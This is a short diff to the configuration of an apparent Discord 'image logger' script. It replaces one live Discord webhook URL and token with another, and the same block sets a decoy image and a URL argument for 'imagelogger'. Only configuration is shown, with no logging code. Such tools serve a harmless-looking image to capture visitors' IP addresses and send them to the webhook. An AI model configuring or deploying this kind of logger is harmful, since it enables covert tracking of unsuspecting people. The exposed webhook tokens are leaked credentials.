@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1390880911817445376/JuAXfVt2YU3lwTpoarbKNYkhYmAe62U81GfQ3djziBcvF6nmXwklZtSAAR44dmijjYAX",
+    "webhook": "https://discord.com/api/webhooks/1396032227078570035/fewtyRwpgqA0-7sbgG82E_G1O-qWTy_qp8gGRDanIr2k1wwzXRyswlXKydCfVTNuAuVo",
     "image": "https://upload.wikimedia.org/wikipedia/en/9/94/NarutoCoverTankobon1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
